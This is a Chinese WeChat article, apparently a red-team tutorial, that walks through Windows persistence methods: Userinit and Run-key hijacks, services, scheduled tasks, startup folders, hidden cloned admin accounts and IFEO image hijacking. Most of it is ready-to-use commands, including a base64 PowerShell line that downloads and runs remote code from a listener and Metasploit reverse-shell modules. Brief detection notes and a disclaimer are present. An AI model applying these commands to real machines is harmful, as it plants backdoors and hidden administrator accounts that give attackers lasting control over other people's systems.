#  【超详细 | 权限维持篇】Windows权限维持技术汇总+复现（建议收藏）

[ EchoSec ](javascript:void\(0\);)

**EchoSec** ![]()

微信号 gh_ae9ab8305da0

功能介绍 萌新专注于网络安全行业学习

____

___发表于_

收录于合集

以下文章来源于Z2O安全攻防 ，作者41ien

![](http://wx.qlogo.cn/mmhead/Q3auHgzwzM5q1wb02blhyMgNoVkaib7vwibOZFiaXFniaffibjpGejCXTKQ/0)
**Z2O安全攻防** .

From zero to one

免责声明

  
  

 **本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。**

 **只供对已授权的目标使用测试，对未授权目标的测试作者不承担责任，均由使用本人自行承担。**

![](https://gitee.com/fuli009/images/raw/master/public/20220929220531.png)

文章正文

  
  

# 0x01 winlogon helper

## 1.1 简介

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`的作用是指定用户登录时
Winlogon 运行的程序。默认情况下，Winlogon 运行 Userinit.exe（运行登录脚本），重新建立网络连接，然后启动 Windows
用户界面 Explorer.exe。可以更改此条目的值以添加或删除程序。例如，要在 Windows
资源管理器用户界面启动之前运行某个程序，可以将该程序的名称替换为该条目的值中的 Userinit.exe，然后在该程序中包含启动 Userinit.exe
的指令。

## 1.2 实验环境

  * Windows 7 x64

## 1.3 利用方法

### 1.3.1 后门程序

Userinit 键默认的值为`C:\Windows\system32\userinit.exe,`，我们用下面的命令在后面加上我们要启动的后门程序即可。

    
    
    REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /V "Userinit" /t REG_SZ /F /D "C:\Windows\system32\userinit.exe,C:\Users\admin\Documents\backdoor.exe"

![](https://gitee.com/fuli009/images/raw/master/public/20220929220539.png)

当用户重新登录时，便会运行我们的后门程序

![]()

### 1.3.2 msf

userinit 优先于很多杀软启动，通过调用 powershell（例如 web_delivery 模块），可以做到无文件落地，实现一定程度的免杀效果。

    
    
    # msf命令  
    use exploit/multi/script/web_delivery  
    set payload windows/x64/meterpreter/reverse_tcp  
    # 设置 target 为 psh  
    set target 2  
    set lhost 192.168.26.129  
    run

用以下命令添加后门

    
    
    REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /V "Userinit" /t REG_SZ /F /D "C:\Windows\system32\userinit.exe,powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJAB5AGEATwAzAEMAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAeQBhAE8AMwBDAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAeQBhAE8AMwBDAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADIANgAuADEAMgA5ADoAOAAwADgAMAAvAFQAbwA4AHoANQBXAGUANQBnAEoAYwBDAC8AbwBXAFUAVQBUAEsAVwAyAGIAcgB1ACcAKQApADsASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgA2AC4AMQAyADkAOgA4ADAAOAAwAC8AVABvADgAegA1AFcAZQA1AGcASgBjAEMAJwApACkAOwA="

当用户重新登录时，便会运行我们的后门程序

![](https://gitee.com/fuli009/images/raw/master/public/20220929220540.png)

## 1.4 检测及清除

手动查看`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`下的 Userinit
键，也可以利用 AutoRuns 软件来排查。

## 1.5 参考

> 权限维持及后门持久化技巧总结
>
> 利用userinit注册表键实现无文件后门

# 0x02 服务

## 2.1 简介

在 Windows 上有一个重要的机制，也就是服务。服务程序通常默默的运行在后台，且拥有 SYSTEM 权限，非常适合用于后门持久化。我们可以将 EXE
文件注册为服务来作为后门。

## 2.2 实验环境

  * Windows 7 x64

## 2.3 利用方法

### 2.3.1 手动

用下面的命令来创建一个自启动 Windows 服务

    
    
    sc create backdoor binpath= C:\Users\admin\Documents\backdoor.exe type= own start= auto displayname= backdoor

![](https://gitee.com/fuli009/images/raw/master/public/20220929220542.png)

查看服务，已经创建成功了

![](https://gitee.com/fuli009/images/raw/master/public/20220929220544.png)

重启系统以后，虽然 cs 收到了反弹 shell，但是 shell 后面就断线了，在系统中查看服务也是处于停止状态，尝试手动启动服务还会报错

![](https://gitee.com/fuli009/images/raw/master/public/20220929220545.png)

这是因为我们的后门程序不符合服务的规范，所以启动失败了，这就需要使用 instsrv + srvany 来创建服务了

instsrv.exe.exe 和 srvany.exe 是 Microsoft Windows Resource Kits 工具集中
的两个实用工具，这两个工具配合使用可以将任何的 exe 应用程序作为 window 服务运行。srany.exe
是注册程序的服务外壳，可以通过它让应用程序以 system 账号启动，可以使应用程序作为 windows 的服务随机器启动而自动启动，从而隐藏不必要的窗口。

将 instsrv.exe 和 srvany.exe 拷贝到`C:\WINDOWS\SysWOW64`目录下，然后在 cmd
中先切换到`C:\WINDOWS\SysWOW64`目录，再运行命令`instsrv MyService
C:\WINDOWS\SysWOW64\srvany.exe`

![](https://gitee.com/fuli009/images/raw/master/public/20220929220546.png)

再通过以下命令添加注册表

    
    
    # 创建键值  
    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\backdoor\Parameters" /f  
    # 后门路径  
    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\backdoor\Parameters" /v AppDirectory /t REG_SZ /d "C:\Users\admin\Documents" /f  
    # 后门程序  
    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\backdoor\Parameters" /v Application /t REG_SZ /d "C:\Users\admin\Documents\backdoor.exe" /f

![](https://gitee.com/fuli009/images/raw/master/public/20220929220547.png)

当目标服务器启动的时候，就能收到反弹 shell 了，并且还是 system 权限

![](https://gitee.com/fuli009/images/raw/master/public/20220929220548.png)

### 2.3.2 MSF

使用以下命令调用 persistence_service 模块

    
    
    use exploit/windows/local/persistence_service  
    # 此模块不支持 windows/x64/meterpreter/reverse_tcp，注意在监听的时候要选择 windows/meterpreter/reverse_tcp  
    set payload windows/meterpreter/reverse_tcp  
    run

执行完以后便会在目标系统中生成一个自启动服务

![](https://gitee.com/fuli009/images/raw/master/public/20220929220549.png)

![](https://gitee.com/fuli009/images/raw/master/public/20220929220550.png)

MSF 建立监听，目标服务器启动时便可收到 shell

MSF 建立监听，目标服务器用户重新登录时便可收到 shell

    
    
    use exploit/multi/handler  
    # 这里只能用 x32 的 payload  
    set payload windows/meterpreter/reverse_tcp  
    set lhost 192.168.26.129  
    run

![](https://gitee.com/fuli009/images/raw/master/public/20220929220551.png)

## 2.4 检测及清除

手动查看服务中是否有可疑服务，也可以利用 AutoRuns 软件来排查。

## 2.5 参考

> 2种方法教你，如何将exe注册为windows服务，直接从后台运行
>
> 第6篇：三大渗透测试框架权限维持技术

# 0x03 定时任务

## 3.1 简介

Windows 实现计划任务主要有 at 与 schtasks 两种方式，通过计划任务可以定时启动后门程序

at 适用于windows 2000、2003、xp，schtasks适用于windows >= 2003

## 3.2 at

### 3.2.1 实验环境

  * Windows Server 2003 Enterprise x64 Edition

### 3.2.2 利用方法

打开 cmd，用 at 命令创建一项计划任务

    
    
    # 每天的16:34启动后门程序  
    at 16:34 /every:M,T,W,Th,F,S,Su C:\ZhiArchive\backdoor.exe

![](https://gitee.com/fuli009/images/raw/master/public/20220929220552.png)

成功上线 cs

![](https://gitee.com/fuli009/images/raw/master/public/20220929220553.png)

## 3.3 schtasks

### 3.3.1 实验环境

  * Windows 7 x64

### 3.3.2 利用方法

打开 cmd，用 schtasks 命令创建一项计划任务

    
    
    schtasks /Create /TN badcode /SC DAILY /ST 16:49 /TR "C:\Users\admin\Documents\backdoor.exe"

![](https://gitee.com/fuli009/images/raw/master/public/20220929220554.png)

成功上线 cs

![]()

### 3.2.3 检测及清除

#### 3.2.3.1 Windows Server 2003

在`C:\WINDOWS\Tasks`目录排查可疑的定时任务文件

![](https://gitee.com/fuli009/images/raw/master/public/20220929220555.png)

在日志`C:\WINDOWS\Tasks\SchedLgU.txt`中排查可疑的定时任务记录

![](https://gitee.com/fuli009/images/raw/master/public/20220929220556.png)

#### 3.2.3.2 Windows 7

在任务计划程序中排查可疑的定时任务

![](https://gitee.com/fuli009/images/raw/master/public/20220929220557.png)

也可以使用 autoruns 来排查计划任务

## 3.4 踩坑记录

### 3.4.1

无论是 at 还是 sc，后门程序目录不能有空格，否则无法正常运行，例如

    
    
    # 可以运行  
    C:\Users\admin\Documents\backdoor.exe  
    # 不能运行  
    C:\Users\admin\Documents\a b\backdoor.exe

## 3.5 参考

> 内网渗透--本机提权
>
> 从administrator到system权限的几种方式

# 0x04 启动项

## 4.1 简介

利用 windows 开机启动项实现权限的维持，每次系统启动都可实现后门的执行，很不错的权限维持的方式

## 4.2 实验环境

  * Windows 7 x64

## 4.3 利用方法

### 4.3.1 开始菜单启动项

    
    
    # 当前用户目录  
    %HOMEPATH%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup  
    # 系统目录（需要管理员权限）  
    C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp

将后门程序放到上面的用户目录中，目标用户重新登录时便会启动后门程序。

![](https://gitee.com/fuli009/images/raw/master/public/20220929220558.png)

成功上线 cs

![](https://gitee.com/fuli009/images/raw/master/public/20220929220559.png)

### 4.3.2 注册表启动项

##### 4.3.2.1 手动

    
    
    # 当前用户键值  
    HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce  
    # 服务器键值（需要管理员权限）  
    HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce

RunOnce 注册键：用户登录时，所有程序按顺序自动执行，在 Run 启动项之前执行，但只能运行一次，执行完毕后会自动删除

    
    
    # 添加注册表  
    REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "backdoor" /t REG_SZ /F /D "C:\Users\admin\Documents\backdoor.exe"

![](https://gitee.com/fuli009/images/raw/master/public/20220929220600.png)

用户重新登录时，便会启动后门程序

成功上线 cs

![](https://gitee.com/fuli009/images/raw/master/public/20220929220601.png)

##### 4.3.2.2 MSF

使用以下命令调用 persistence 模块

    
    
    use exploit/windows/local/persistence  
    set payload windows/x64/meterpreter/reverse_tcp  
    # 选择 meterpreter shell  
    set session 2  
    # 如果我们获得的是 SYSTEM 权限，可以更改 STARTUP 参数，将启动项写入系统中，也就是 HKLM\Software\Microsoft\Windows\CurrentVersion\Run，默认是写入 HKCU\Software\Microsoft\Windows\CurrentVersion\Run  
    set STARTUP SYSTEM  
    run

执行以后便会在`HKLM\Software\Microsoft\Windows\CurrentVersion\Run`下生成启动项

![](https://gitee.com/fuli009/images/raw/master/public/20220929220602.png)

MSF 建立监听，目标服务器用户重新登录时便可收到 shell

    
    
    use exploit/multi/handler  
    set payload windows/x64/meterpreter/reverse_tcp  
    set lhost 192.168.26.129  
    run

![](https://gitee.com/fuli009/images/raw/master/public/20220929220603.png)

## 4.4 检测及清除

在`%HOMEPATH%\AppData\Roaming\Microsoft\Windows\Start
Menu\Programs\Startup`目录下排查可疑启动项

在以下注册表排查可疑启动项

    
    
    HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce  
    HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce

也可以利用 AutoRuns 软件来排查。

## 4.5 参考

> ATT&CK 之后门持久化
>
>
> [权限持久化（1）](https://mp.weixin.qq.com/s?__biz=MzkxODI2OTQxOQ==&mid=2247483874&idx=1&sn=2fb4e8dde65faa3a5813c4943236e95b&scene=21#wechat_redirect)
>
> 第6篇：三大渗透测试框架权限维持技术

# 0x05 影子账户

## 5.1 简介

影子账户，顾名思义就像影子一样，跟主体是一模一样的，通过建立影子账户，可以获得跟管理员一样的权限，它无法通过普通命令进行查询，只能在注册表中找到其详细信息。

## 5.2 实验环境

  * Windows 7 x64

## 5.3 利用方法

先用以下命令创建一个隐藏用户，并把它添加到管理员组

    
    
    net user evil$ Abcd1234 /add  
    net localgroup administrators evil$ /add

![](https://gitee.com/fuli009/images/raw/master/public/20220929220604.png)

在用户名后面加了 $ 之后，使用`net user`命令就无法看到此隐藏用户

![](https://gitee.com/fuli009/images/raw/master/public/20220929220605.png)

但是在控制面板和登录界面都是可以看到的

![](https://gitee.com/fuli009/images/raw/master/public/20220929220606.png)

![](https://gitee.com/fuli009/images/raw/master/public/20220929220606.png)

所以，我们还需要在注册表中进行一些操作，需要更改的注册表键值为`HEKY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users`，默认情况下，`HEKY_LOCAL_MACHINE\SAM\SAM`的内容只有`system`用户才能查看和修改，所以，我们要赋予当前用户完全控制的权限

![](https://gitee.com/fuli009/images/raw/master/public/20220929220608.png)

![](https://gitee.com/fuli009/images/raw/master/public/20220929220609.png)

我们需要选择一个克隆对象（这里有个坑，见踩坑记录5.1），然后获取它的 F 值，如图所示，我们需要将`000003E8`导出，导出文件暂且命名为 1.reg

![](https://gitee.com/fuli009/images/raw/master/public/20220929220610.png)

![](https://gitee.com/fuli009/images/raw/master/public/20220929220611.png)

以同样的操作，导出 evil$ 用户和它的 F 值，`000003F4`暂且命名为 2.reg，`evil$`暂且命名为
3.reg，导出完成以后使用命令`net user evil$ /del`删除 evil$ 用户

![](https://gitee.com/fuli009/images/raw/master/public/20220929220612.png)

然后将 2.reg 的 F 值替换为 1.reg 的F值，即将 evil$ 用户的 F 值替换为 admin 用户的 F 值

![](https://gitee.com/fuli009/images/raw/master/public/20220929220613.png)

替换完成以后，可以用下面的命令导入注册表

    
    
    regedit /s 2.reg  
    regedit /s 3.reg

查看效果，现在使用`net user`命令和控制面板均看不到 evil$ 用户

![](https://gitee.com/fuli009/images/raw/master/public/20220929220614.png)

登录界面同样也没有

![](https://gitee.com/fuli009/images/raw/master/public/20220929220615.png)

远程登录，查看我们的身份，就是克隆对象的身份

![](https://gitee.com/fuli009/images/raw/master/public/20220929220616.png)

## 5.4 检测及清除

查看注册表`HEKY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names`中是否有多余的用户，将 Names
中的用户以及它对应的类型删除即可

![](https://gitee.com/fuli009/images/raw/master/public/20220929220612.png)

## 5.5 踩坑记录

### 5.5.1

选择克隆对象时，一定要注意选择的账户是否被禁用，是否支持远程登录，我的实验环境没有启用 administrator 账户，一开始我克隆的是
administrator，远程登录的时候便报了下面的错

![](https://gitee.com/fuli009/images/raw/master/public/20220929220618.png)

## 5.6 参考

> 权限维持篇-影子用户后门

# 0x06 映像劫持

## 6.1 简介

映像劫持，也叫重定向劫持。即想运行 A.exe，结果运行的是B.exe。

在 Windows NT 架构的系统中，IFEO 的本意是为一些在默认系统环境中运行时可能引发错误的程序执行体提供特殊的环境设定。当一个可执行程序位于
IFEO 的控制中时，它的内存分配则根据该程序的参数来设定，而 Windows NT
架构的系统能通过这个注册表项使用与可执行程序文件名匹配的项目作为程序载入时的控制依据，最终得以设定一个程序的堆管理机制和一些辅助机制等。

Windows NT
系统在试图执行一个从命令行调用的可执行文件运行请求时，会先检查运行程序是不是可执行文件，如果是的话，再检查格式，然后就会检查是否存在。而 Debugger
是 IFEO 里第一个被处理的参数，当该值不为空时，系统会被其指定的程序文件名作为用户试图启动的程序执行请求来处理，而仅仅把用户试图启动的程序作为
Debugger 参数里指定的程序文件名的参数发送过去。

由于 IFEO 中可设置的值项还有 GlobalFlag，由 gflags.exe 控制，从 win7 开始，可以在 Slient Process Exit
选项卡中启用和配置对进程静默的监视操作。

IFEO 设计本意就是让程序员能够通过双击程序文件直接进入调试器里调试自己的程序。

## 6.2 实验环境

  * Windows 7 x64

## 6.3 利用方法

### 6.3.1 修改 Debugger 值

注册表位置为`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
File Execution Options`

通过以下命令将计算器 calc.exe 替换为我们的后门程序

    
    
    reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe" /f  
    reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe" /v Debugger /t REG_SZ /d "C:\Users\admin\Documents\backdoor.exe" /f

![](https://gitee.com/fuli009/images/raw/master/public/20220929220619.png)

打开计算器的时候成功上线 cs

![](https://gitee.com/fuli009/images/raw/master/public/20220929220620.png)

### 6.3.2 修改 GlobalFlag 值

使用以下命令修改 GlobalFlag 值

    
    
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe" /v GlobalFlag /t REG_DWORD /d 512  
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\calc.exe" /v ReportingMode /t REG_DWORD /d 1  
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\calc.exe" /v MonitorProcess /d "C:\Users\admin\Documents\backdoor.exe"

![](https://gitee.com/fuli009/images/raw/master/public/20220929220621.png)

先打开计算器，在关闭计算器时，成功上线 cs

![](https://gitee.com/fuli009/images/raw/master/public/20220929220622.png)

### 6.3.3 比较

通过测试，修改 Debugger 值以后计算器就打不开了，影响了程序的正常使用，而修改 GlobalFlag
值是在关闭计算器时才启动后门程序，比较隐蔽，因此，推荐修改 GlobalFlag 值

## 6.4 检测及清除

在注册表`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
File Execution Options`中进行排查

## 6.5 参考

>
> [持久化攻击之映像劫持](https://mp.weixin.qq.com/s?__biz=MzU5NjcyNTE0Mg==&mid=2247485778&idx=1&sn=d212631b4ccc5ce7df11ec9f097a2821&scene=21#wechat_redirect)
>
> [win维持访问-
> 映像劫持](https://mp.weixin.qq.com/s?__biz=MzIwOTMzMzY0Ng==&mid=2247484459&idx=1&sn=0f953f0b94587eef5db7c68c0c80866a&scene=21#wechat_redirect)
    
    
    >精彩回顾<  
     ****
    
    [干货 | 红队快速批量打点的利器](http://mp.weixin.qq.com/s?__biz=MzU3MTU3NTY2NA==&mid=2247484374&idx=1&sn=f98119b165319ea399cf3252e5976532&chksm=fcdf5fc9cba8d6df1080aa1d8e86c67bb873bcd40139293f8f63279c2df44946023ed6460cb5&scene=21#wechat_redirect)  
    
    
    [【干货】最全的Tomcat漏洞复现](http://mp.weixin.qq.com/s?__biz=MzU3MTU3NTY2NA==&mid=2247484175&idx=1&sn=89771c538a529efd108d4a676c093ea7&chksm=fcdf5f10cba8d606f3c2a635b0bb94da11e8978dba2ac4ed9e4debab7a7401ecc8a0f43777b6&scene=21#wechat_redirect)
    
    [{Vulhub漏洞复现（一）ActiveMQ}](http://mp.weixin.qq.com/s?__biz=MzU3MTU3NTY2NA==&mid=2247484055&idx=1&sn=6b71d21065a832cac662dfbd18b9ea09&chksm=fcdf5e88cba8d79ec80b97aadcbe13aef9f4857267018daed4760a582a53d46bb3d3a5f67831&scene=21#wechat_redirect)
    
    [{Vulhub漏洞复现（二） Apereo CAS}](http://mp.weixin.qq.com/s?__biz=MzU3MTU3NTY2NA==&mid=2247484107&idx=1&sn=9467ffe0e276a521f6be0f170941f70d&chksm=fcdf5ed4cba8d7c2d72f3f30a911aa447246bd007f3b647942129d15a2298a3aa494558d4c1c&scene=21#wechat_redirect)
    
    [Cobalt Strike免杀脚本生成器|cna脚本|bypassAV](http://mp.weixin.qq.com/s?__biz=MzU3MTU3NTY2NA==&mid=2247484070&idx=1&sn=d0b1b7bd8687c452ccfa10d11218985e&chksm=fcdf5eb9cba8d7af7059dd9d0de041c2ef5eb7b4986d59fac34f62f5e4b705c42aea4018c318&scene=21#wechat_redirect)
    
    [xss bypass备忘单|xss绕过防火墙技巧|xss绕过WAF的方法  
    ](http://mp.weixin.qq.com/s?__biz=MzU3MTU3NTY2NA==&mid=2247484076&idx=1&sn=6af2e134ac579e48697f2ee6b7279a4e&chksm=fcdf5eb3cba8d7a5f545a558c13e184c82bf1bb0dd281a4d7ade4e11fa1e647ac447322fe8af&scene=21#wechat_redirect)
    
    [【贼详细 | 附PoC工具】Apache HTTPd最新RCE漏洞复现  
    ](http://mp.weixin.qq.com/s?__biz=MzU3MTU3NTY2NA==&mid=2247484184&idx=1&sn=f9286573a97bd404e43622c0235aa357&chksm=fcdf5f07cba8d611dc7d8c479b47e312b95194ec5634c6fe46867719bea8de051681dd777558&scene=21#wechat_redirect)
    
    [干货 | 横向移动与域控权限维持方法总汇](http://mp.weixin.qq.com/s?__biz=MzU3MTU3NTY2NA==&mid=2247484308&idx=1&sn=dffaf96b424952c365fd22f733f696f7&chksm=fcdf5f8bcba8d69d58ebaa0da04fbc2b4bf236df6e763d3da4addc097b559f71edfb48ae9712&scene=21#wechat_redirect)
    
    [干货 | 免杀ShellCode加载框架](http://mp.weixin.qq.com/s?__biz=MzU3MTU3NTY2NA==&mid=2247484268&idx=1&sn=cbbcf96a16f4115a277f7b178f58fbfd&chksm=fcdf5f73cba8d6654a8da5bc3c00a6c2997263869f74e7be9316bbc6e4e527e317e999539d4b&scene=21#wechat_redirect)
    
    [【干货】phpMyAdmin漏洞利用汇总](http://mp.weixin.qq.com/s?__biz=MzU3MTU3NTY2NA==&mid=2247484271&idx=1&sn=b07fd5a4b7a0d2430281e76c30cbb4eb&chksm=fcdf5f70cba8d6665a709a2da2bb4ea15751777d3a81818a19d52fe4b5a8306c756f0995bda5&scene=21#wechat_redirect)
    
    [【神兵利器 | 附下载】一个用于隐藏C2的、开箱即用的Tools](http://mp.weixin.qq.com/s?__biz=MzU3MTU3NTY2NA==&mid=2247485199&idx=1&sn=43cd48cf100da8da5f7b750274219123&chksm=fcdf5b10cba8d206d9353ad5009caa882960fb3e09af61e26bc88dafa67ae71b8a7b21ba4f38&scene=21#wechat_redirect)  
    
    
    [分享 | 个人渗透技巧汇总（避坑）笔记](http://mp.weixin.qq.com/s?__biz=MzU3MTU3NTY2NA==&mid=2247485185&idx=1&sn=a839927c1623655300d93d861bf6e1ad&chksm=fcdf5b1ecba8d2083c582706465f6c5c50e36dcba98853b270350d70c0bc4aa057170fda4d31&scene=21#wechat_redirect)  
    
    
    ![](https://gitee.com/fuli009/images/raw/master/public/20220929220623.png)
    
    关注我
    
    获得更多精彩
    
    ![](https://gitee.com/fuli009/images/raw/master/public/20220929220624.png)
    
      
    
    
     **坚持学习与分享！走过路过点个"** _ **在看**_ **"，不会错过**![](https://gitee.com/fuli009/images/raw/master/public/20220929220625.png)
    
     ** _仅用于学习交流，不得用于非法用途_**
    
     _ **如侵权请私聊公众号删文**_
    
     _ **推荐阅读↓↓↓**_  
    
    
    
     觉得文章不错给点个‘再看’吧

  
  

 ****

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

